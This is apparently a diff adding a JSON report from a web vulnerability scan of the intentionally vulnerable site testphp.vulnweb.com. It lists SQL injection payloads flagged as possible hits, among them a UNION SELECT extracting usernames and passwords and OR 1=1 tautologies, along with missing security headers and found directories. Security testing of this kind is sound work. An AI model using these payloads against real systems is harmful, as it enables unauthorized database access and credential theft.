@@ -1,0 +1,18 @@
+{
+    "scan_date": "2025-05-03_19-52-21",
+    "vulnerabilities": [
+        "[SQL Injection Test] Target: http://testphp.vulnweb.com",
+        "[!] Possible SQL Injection at: http://testphp.vulnweb.com?id='",
+        "[!] Possible SQL Injection at: http://testphp.vulnweb.com?id=' OR '1'='1",
+        "[!] Possible SQL Injection at: http://testphp.vulnweb.com?id=' UNION SELECT NULL, username, password FROM users --",
+        "[!] Possible SQL Injection at: http://testphp.vulnweb.com?id=\" OR \"1\"=\"1\" --",
+        "[!] Possible SQL Injection at: http://testphp.vulnweb.com?id=1' OR 1=1 --",
+        "\n[XSS Test] Target: http://testphp.vulnweb.com",
+        "[+] No XSS vulnerabilities found.",
+        "\n[Security Header Check] Target: http://testphp.vulnweb.com",
+        "[!] Missing headers: Content-Security-Policy, Strict-Transport-Security, X-Frame-Options, X-Content-Type-Options",
+        "\n[+] Found directories:\n",
+        "http://testphp.vulnweb.com/admin",
+        "http://testphp.vulnweb.com/images"
+    ]
+}
